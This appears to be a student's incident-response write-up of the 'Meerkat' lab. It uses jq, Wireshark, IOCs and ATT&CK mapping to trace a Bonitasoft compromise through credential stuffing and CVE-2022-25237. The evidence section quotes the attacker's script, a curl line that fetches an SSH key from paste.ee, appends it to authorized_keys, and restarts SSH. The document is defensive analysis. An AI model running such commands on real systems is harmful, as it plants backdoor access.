## 1. Introduction & Scenario 
 **Name** - Meerkat  
 **Investigative premise** - PCAP and Log data 
 
You are brought in as the new security provider for Forela, a fast-growing startup. The startup has been using a business management platform, but with insufficient documentation and potentially lax security practices. You are provided with PCAP and log data and are tasked with determining if a compromise has occurred. This scenario pushes the you to employ your analysis skills, effectively sifting through network data and logs to detect potential signs of intrusion, thereby offering a realistic taste of the pivotal role cybersecurity plays in the protection of burgeoning businesses.
## 2. **Tools & Environment** 
 analysis software list
### Tools; 
- **Jq** - for organizing  messy JSON files
```
jq .  meerkat-alerts.json 
```
*To initially view the JSON file. Pay attention to how the different fields are named, it will come in handy*

```
jq '.[].alert.signature' meerkat-alerts.json -r
```
*This displays specifically the alerts filed in the JSON file as clean strings of text you can easily read*

```
jq '.[].alert.signature' meerkat-alerts.json -r | sort | uniq -c | sort -nr 

```
*To further sort the out put*


```
jq '.[].src_ip' meerkat-alerts.json -r | sort | uniq -c | sort -nr
```
*To get the source IPs*


```
jq -r '.[] | "\(.src_ip) \(.alert.signature)"' meerkat-alerts.json | sort | uniq -c | sort -nr
```
*To combine the two specific  fields for one output*


- **Wire shark** 
*Used for analyzing  PCAP* 
Open it and select the PCAP file.

```
ip.addr == the desired ip address
```

```
(ip.addr == the ip address) && (_ws.col.protocol == "HTTP")
```

- Browserling
- MITRE ATT&CK
## 3. **Step-by-Step Investigation** 
each task question with filters, commands, registry paths
This is supposed to be the part with the detailed screen shoots and  command sippets.

## 4. **Evidence & IOCs** — extracted indicators, attack chain mapping

## Executive Summary

An external threat actor conducted a targeted attack against **Fella's** business management platform running **Bonitasoft**. The attacker initially carried out a **Credential Stuffing** attack against the login service, successfully compromising a legitimate user account (`seb.broom@fella.co.uk`).

Exploiting an authorization bypass vulnerability (**CVE-2022-25237**) in Bonitasoft via the `i18nTranslation` API path, the adversary uploaded a malicious RCE extension zip file to execute arbitrary system commands (`whoami`, `wget`). The attacker then fetched a rogue SSH public key hosted on `paste.ee`, appended it to `/home/ubuntu/.ssh/authorized_keys`, and restarted the SSH service to establish persistent administrative access.

## Indicators of Compromise (IOCs)

### 1. Network Indicators

|**Indicator**|**Type**|**Description / Role**|
|---|---|---|
|`156.146.62.213`|IPv4 Address|**Primary Attacker IP:** Reconnaissance, Credential Stuffing, and initial exploitation trigger (`whoami`).|
|`138.99.59.221`|IPv4 Address|**Secondary Attacker IP:** Staging payload delivery execution (`wget`).|
|`95.181.232.30`|IPv4 Address|**Inbound SSH IP:** Attacker connecting via SSH using the planted SSH key.|
|`paste.ee`|Domain|**C2 / Staging Infrastructure:** Text-sharing platform used to host the malicious bash staging script and public key.|
|`fella.co.uk:8080`|Domain / Host|Compromised internal target server hosting Bonitasoft.|

### 2. Host, File & Endpoint Artifacts

|**Artifact**|**Type**|**Description**|
|---|---|---|
|`CVE-2022-25237`|Vulnerability|Bonitasoft Authorization Bypass & Remote Code Execution (RCE).|
|`i18nTranslation`|URI String|String appended to API endpoints (e.g., `/i18nTranslation`) to bypass authorization filters.|
|`rce_api_extension.zip`|File|Malicious API extension zip uploaded to achieve command execution.|
|`hfffGR4unv`|File Name|Name of the attacker’s public key retrieved from `paste.ee`.|
|`/home/ubuntu/.ssh/authorized_keys`|File Path|Targeted file modified to add the attacker's SSH key for backdoored access.|

### 3. Compromised Credentials & Authentication Evidence

- **Compromised User Account:** `seb.broom@fella.co.uk` (URL decoded from `seb.broom%40fella.co.uk`)
    
- **Compromised Password:** `government`
    
- **Authentication Status Code:** HTTP `204 No Content` (Successful authentication; all failed attempts returned HTTP `401 Unauthorized`).
    
- **Total Credential Stuffing Attempts:** **56** distinct username/password combinations.
    

## Cyber Kill Chain & MITRE ATT&CK Mapping

```
[ Credential Stuffing (T1110.004) ] ──> [ CVE-2022-25237 Auth Bypass (T1190) ]
                                                       │
                                                       ▼
[ Ingress Tool Transfer / Staging (T1105) ] <── [ Malicious API Zip Upload (T1203) ]
                    │
                    ▼
[ SSH Authorized Keys Persistence (T1098.004) ] ──> [ Direct Ingress Access (T1021.004) ]
```

|**Attack Stage**|**MITRE ATT&CK Technique**|**ID**|**Observables / Evidence**|
|---|---|---|---|
|**Credential Access**|Brute Force: Credential Stuffing|**T1110.004**|56 automated `POST` requests to Bonita `/loginservice` using `Python-requests` user agent.|
|**Initial Access / Execution**|Exploit Public-Facing Application|**T1190**|Authorization bypass on Bonitasoft via `i18nTranslation` endpoint parameter (**CVE-2022-25237**).|
|**Command & Control**|Ingress Tool Transfer|**T1105**|HTTP `GET` request executing `wget` to retrieve a remote script hosted on `paste.ee`.|
|**Persistence**|Account Manipulation: SSH Authorized Keys|**T1098.004**|Script appended external SSH key to `/home/ubuntu/.ssh/authorized_keys` and ran `sudo service ssh restart`.|
|**Lateral Movement**|Remote Services: SSH|**T1021.004**|Subsequent SSH connection established from `95.181.232.30`.|

## Detailed Evidence Analysis

### Suricata Alert Analysis (`meerkat-alerts.json`)

- High volume of alerts triggered for:
    
    - `USER_AGENT Python-requests`
        
    - `Possible Staging for CVE-2022-25237` (Bonitasoft)
        
    - `ATTACK_RESPONSE Possible /etc/passwd`
        

### Network Packet Analysis (`meerkat.pcap`)

1. **Recon & Credential Stuffing:** Attacker IP `156.146.62.213` generated 118 POST requests to Bonita's login endpoint. Analysis revealed 56 unique username/password pairs tested.
    
2. **Exploitation:** Successful login was observed for `seb.broom@fella.co.uk` / `government` (HTTP status `204`).
    
3. **Payload Upload & Execution:** The attacker used `i18nTranslation` to upload `rce_api_extension.zip` and executed system checks (`whoami`).
    
4. **Persistence Routine:** From IP `138.99.59.221`, a `wget` command fetched a shell script from `paste.ee`. The script contained:
    
    Bash
    
    ```
    curl -s https://paste.ee/r/.../hfffGR4unv >> /home/ubuntu/.ssh/authorized_keys
    sudo service ssh restart
    ```
    
5. **Interactive Access:** Shortly after execution, IP `95.181.232.30` initiated an active SSH session to the server.